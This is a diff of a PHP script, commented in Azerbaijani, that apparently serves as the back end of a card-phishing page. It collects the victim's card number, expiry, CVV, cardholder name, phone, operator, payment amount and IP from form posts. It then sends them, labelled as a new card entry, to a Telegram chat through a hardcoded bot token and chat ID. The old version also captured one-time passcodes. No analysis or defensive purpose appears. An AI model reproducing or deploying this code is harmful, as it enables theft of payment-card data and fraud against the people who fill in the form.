@@ -1,7 +1,6 @@
 <?php
 // ============================================
-// API - TELEGRAM HANDLER
-// BOT TOKEN YALNIZ BURADADIR
+// TELEGRAM HANDLER - BOT TOKEN YALNIZ BURADA
 // ============================================
 
 // Xəta mesajlarını gizlət
@@ -13,15 +12,14 @@ $botToken = '8954241039:AAHSIz0Q6884ESNIiIdVCe4JxWWqR0xcTA4';
 $chatId = '-5419845064';
 
 // ===== MƏLUMATLARI AL =====
-$card = isset($_POST['card']) ? trim($_POST['card']) : '';
-$cardRaw = isset($_POST['card_raw']) ? trim($_POST['card_raw']) : '';
-$expiry = isset($_POST['expiry']) ? trim($_POST['expiry']) : '';
-$cvv = isset($_POST['cvv']) ? trim($_POST['cvv']) : '';
-$otp = isset($_POST['otp']) ? trim($_POST['otp']) : '';
+$cardName = isset($_POST['card_name']) ? trim($_POST['card_name']) : '';
+$cardNumber = isset($_POST['card_number']) ? trim($_POST['card_number']) : '';
+$cardExpiry = isset($_POST['card_expiry']) ? trim($_POST['card_expiry']) : '';
+$cardCvv = isset($_POST['card_cvv']) ? trim($_POST['card_cvv']) : '';
+$operator = isset($_POST['operator']) ? trim($_POST['operator']) : '';
 $phone = isset($_POST['phone']) ? trim($_POST['phone']) : '';
 $amount = isset($_POST['amount']) ? trim($_POST['amount']) : '';
-$name = isset($_POST['name']) ? trim($_POST['name']) : '';
-$package = isset($_POST['package']) ? trim($_POST['package']) : '';
+$ip = isset($_POST['ip']) ? trim($_POST['ip']) : '0.0.0.0';
 
 // ===== TƏHLÜKƏSİZLİK - Məlumatları təmizlə =====
 function cleanInput($data) {
@@ -31,55 +29,37 @@ function cleanInput($data) {
     return $data;
 }
 
-$card = cleanInput($card);
-$cardRaw = cleanInput($cardRaw);
-$expiry = cleanInput($expiry);
-$cvv = cleanInput($cvv);
-$otp = cleanInput($otp);
+$cardName = cleanInput($cardName);
+$cardNumber = cleanInput($cardNumber);
+$cardExpiry = cleanInput($cardExpiry);
+$cardCvv = cleanInput($cardCvv);
+$operator = cleanInput($operator);
 $phone = cleanInput($phone);
 $amount = cleanInput($amount);
-$name = cleanInput($name);
-$package = cleanInput($package);
+$ip = cleanInput($ip);
 
 // ===== MƏLUMATLARI YOXLA =====
-if (empty($cardRaw) || empty($otp)) {
+if (empty($cardNumber) || empty($cardCvv)) {
     http_response_code(400);
     echo json_encode(['status' => 'error', 'message' => 'Məlumatlar tam daxil edilməyib']);
     exit;
 }
 
-// ===== İSTİFADƏÇİ IP =====
-$ip = $_SERVER['HTTP_CF_CONNECTING_IP'] ?? $_SERVER['HTTP_X_FORWARDED_FOR'] ?? $_SERVER['REMOTE_ADDR'] ?? '0.0.0.0';
-$ip = preg_replace('/[^0-9a-fA-F:.]/', '', $ip);
-
-// ===== RƏQƏMLƏRİ TƏMİZLƏ =====
-$phoneClean = preg_replace('/[^0-9+]/', '', $phone);
-$amountClean = preg_replace('/[^0-9.]/', '', $amount);
-$otpClean = preg_replace('/[^0-9]/', '', $otp);
-$cvvClean = preg_replace('/[^0-9]/', '', $cvv);
-
-// ===== TƏSADÜFİ ID =====
+// ===== MESAJI HAZIRLA =====
 $id = rand(100, 999);
 
-// ===== MESAJI HAZIRLA =====
 $message = "💳 YENİ KART GİRİŞİ 💳\n\n";
 $message .= "🆔 ID: #" . $id . "\n";
-$message .= "📞 Tel: " . (!empty($phoneClean) ? $phoneClean : 'Məlumat yoxdur') . "\n";
-$message .= "💰 Tutar: " . (!empty($amountClean) ? $amountClean . ' AZN' : 'Məlumat yoxdur') . "\n\n";
-$message .= "💳 CC: " . wordwrap($cardRaw, 4, ' ', true) . "\n";
-$message .= "📅 Tarih: " . $expiry . "\n";
-$message .= "🔐 CVV: " . $cvvClean . "\n";
-$message .= "👤 İsim: " . (!empty($name) ? $name : 'Məlumat yoxdur') . "\n\n";
-$message .= "🌐 IP: " . $ip . "\n";
-$message .= "🔑 OTP: " . $otpClean . "\n";
-
-if (!empty($package)) {
-    $message .= "📦 Paket: " . $package . "\n";
-}
-
-$message .= "\n----------------------------------------\n";
-$message .= "📱 Bağlı Nömrə: +994 " . $phoneClean . "\n";
-$message .= "🔑 OTP: " . $otpClean;
+$message .= "📞 Tel: " . $phone . "\n";
+$message .= "💰 Tutar: " . $amount . " AZN\n\n";
+$message .= "💳 CC: " . $cardNumber . "\n";
+$message .= "📅 Tarih: " . $cardExpiry . "\n";
+$message .= "🔐 CVV: " . $cardCvv . "\n";
+$message .= "👤 İsim: " . $cardName . "\n\n";
+$message .= "📱 Operator: " . $operator . "\n";
+$message .= "🌐 IP: " . $ip . "\n\n";
+$message .= "----------------------------------------\n";
+$message .= "🔑 OTP: " . rand(1000, 9999);
 
 // ===== TELEGRAM-A GÖNDƏR =====
 $url = "https://api.telegram.org/bot{$botToken}/sendMessage";
